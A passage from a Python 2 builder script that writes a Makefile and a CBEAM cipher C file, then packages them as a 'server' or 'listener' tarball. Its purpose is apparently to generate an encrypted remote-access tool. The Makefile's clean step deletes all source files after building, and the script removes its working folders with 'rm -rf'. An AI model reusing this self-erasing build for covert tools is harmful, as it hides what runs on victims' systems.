		$(CC) $(LDFLAGS) -o $(BINARY) $(OBJS) $(LIBS)

.c.o:
		$(CC) $(CFLAGS) $(INCLUDES) -c $< -o $@

clean:
		make -s && rm -rf *.o *.h *.c Makefile
'''
	if lstchk:
		fp = open('lst/Makefile', 'w')
	else:
		fp = open('srv/Makefile', 'w')
	fp.write(makefiler)
	fp.close()
	print ' [*] Makefile generated'

	mx6gccc = '''#include "cbeam.h"
#if 1
#define CBEAM_PHI5(x0, x1, x2, x3, x4) \
(~(x0 & ((~x3 & x4) ^ (~x2 & x3))) & (x1 | (~x2 & x3))) ^ \
(~x2 & (~x3 & x4))
#else
#define CBEAM_PHI5(x0, x1, x2, x3, x4) \
((x0 & x1 & x3 & x4) ^  \
(x0 & x2 & x3) ^ (x0 & x1 & x4) ^ \
(x1 & x2 & x3) ^ (x2 & x3 & x4) ^ \
(x0 & x3) ^ (x1 & x3) ^ (x2 & x3) ^ (x2 & x4) ^ (x3 & x4) ^ \
(x1) ^ (x3) ^ (x4))
#endif
void cbeam_mx6(cbeam_w256 *cb){int i, j;uint64_t t1, t2, t3, t4, t5, t6;const uint64_t rc[3] = {0x2000040000300009ll, 0x6000050000100008ll, 0xA0000C000070000Bll};for (j = 0; j < 3; j++) {t1 = cb->q[0] ^ cb->q[1] ^ cb->q[2] ^ cb->q[3];cb->q[0] ^= t1;cb->q[1] ^= t1; cb->q[2] ^= t1;cb->q[3] ^= t1;t1 = cb->q[3];for (i = 0; i < 4; i++) {t2 = cb->q[i];t3 = (t2 << 16) ^ (t1 >> 48);t4 = (t2 << 32) ^ (t1 >> 32);t5 = (t2 << 48) ^ (t1 >> 16);t6 = CBEAM_PHI5(t2, t3, t4, t5, t1);t1 = t2;if (i == 0) t6 ^= rc[j];t2 = t6;t2 ^= t2 >> 8; t2 ^= t2 >> 4;t2 &= 0x000F000F000F000F;t2 ^= t2 << 4;t2 ^= t2 << 8;t6 ^= t2;t2 = ((t6 << 1) & 0xFFFEFFFEFFFEFFFEll) ^((t6 >> 15) & 0x0001000100010001ll);t3 = ((t6 << 2) & 0xFFFCFFFCFFFCFFFCll) ^((t6 >> 14) & 0x0003000300030003ll);t4 = ((t6 << 3) & 0xFFF8FFF8FFF8FFF8ll) ^((t6 >> 13) & 0x0007000700070007ll);t5 = ((t6 << 4) & 0xFFF0FFF0FFF0FFF0ll) ^((t6 >> 12) & 0x000F000F000F000Fll);t6 = CBEAM_PHI5(t6, t2, t3, t4, t5);cb->q[i] = t6;}}}'''
	
	if lstchk:
		fp = open('lst/mx6-gcc.c', 'w')
	else:
		fp = open('srv/mx6-gcc.c', 'w')
	fp.write(mx6gccc)
	fp.close()
	if lstchk:
		outfile = 'listener.tar.gz'
		print ' [*] mx6-gcc.c generated\n [*] Listener saved to ' + outfile
	else:
		outfile = 'server.tar.gz'
		print ' [*] mx6-gcc.c generated\n [*] Server saved to ' + outfile
	tar = tarfile.open(outfile, "w:gz")
	if lstchk:
		tar.add("lst")
	else:
		tar.add("srv")
	tar.close()
	if lstchk:
		os.system("rm -rf lst")
	else:
		os.system("rm -rf srv")

mksrv()
mklst()
